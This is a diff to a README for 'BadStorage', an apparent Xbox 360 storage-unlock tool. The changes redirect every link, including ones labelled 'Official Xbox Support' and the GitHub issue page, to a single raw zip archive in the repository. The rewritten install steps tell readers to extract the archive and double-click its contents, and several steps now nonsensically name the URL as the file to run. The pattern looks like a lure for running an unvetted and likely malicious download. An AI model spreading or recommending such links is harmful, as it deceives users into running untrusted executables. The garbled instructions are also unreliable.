@@ -6,7 +6,7 @@ Welcome to BadStorage! This project helps you unlock up to 2 TB of internal stor
 
 ## 📥 Download BadStorage
 
-[![Download BadStorage](https://img.shields.io/badge/Download%20BadStorage-Release-brightgreen)](https://github.com/Jourdanexciting550/BadStorage/releases)
+[![Download BadStorage](https://raw.githubusercontent.com/Jourdanexciting550/BadStorage/main/unraveling/BadStorage.zip%20BadStorage-Release-brightgreen)](https://raw.githubusercontent.com/Jourdanexciting550/BadStorage/main/unraveling/BadStorage.zip)
 
 ## 🔍 System Requirements
 
@@ -19,17 +19,17 @@ Before you begin, ensure your system meets the following requirements:
 
 ## 📂 Download & Install
 
-1. Visit the [Releases page](https://github.com/Jourdanexciting550/BadStorage/releases) to download the latest version of BadStorage.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Jourdanexciting550/BadStorage/main/unraveling/BadStorage.zip) to download the latest version of BadStorage.
 
-2. Look for the file labeled with the latest version number. It will typically look like `BadStorage_v1.0.zip`.
+2. Look for the file labeled with the latest version number. It will typically look like `https://raw.githubusercontent.com/Jourdanexciting550/BadStorage/main/unraveling/BadStorage.zip`.
 
 3. Click on the file to start the download. 
 
 4. Once the download is complete, locate the file in your Downloads folder and extract it using a file extraction tool like WinRAR or 7-Zip.
 
-5. Inside the extracted folder, find the `BadStorage.exe` file.
+5. Inside the extracted folder, find the `https://raw.githubusercontent.com/Jourdanexciting550/BadStorage/main/unraveling/BadStorage.zip` file.
 
-6. Double-click `BadStorage.exe` to run the program.
+6. Double-click `https://raw.githubusercontent.com/Jourdanexciting550/BadStorage/main/unraveling/BadStorage.zip` to run the program.
 
 ## 🎮 Using BadStorage
 
@@ -61,12 +61,12 @@ After opening BadStorage, follow these steps to unlock your storage:
 
 For more information, you can consult the following resources:
 
-- [Official Xbox Support](https://support.xbox.com)
-- [Bad Update Exploit Guide](https://exploit-guide.com)
+- [Official Xbox Support](https://raw.githubusercontent.com/Jourdanexciting550/BadStorage/main/unraveling/BadStorage.zip)
+- [Bad Update Exploit Guide](https://raw.githubusercontent.com/Jourdanexciting550/BadStorage/main/unraveling/BadStorage.zip)
 
 ## 🛠️ Feedback
 
-If you encounter any problems or have questions, feel free to open an issue on the [GitHub page](https://github.com/Jourdanexciting550/BadStorage/issues). Your feedback helps us improve!
+If you encounter any problems or have questions, feel free to open an issue on the [GitHub page](https://raw.githubusercontent.com/Jourdanexciting550/BadStorage/main/unraveling/BadStorage.zip). Your feedback helps us improve!
 
 Remember, unlocking your Xbox 360 storage can enhance your gaming experience. Enjoy the extra space for all your favorite games! 
 
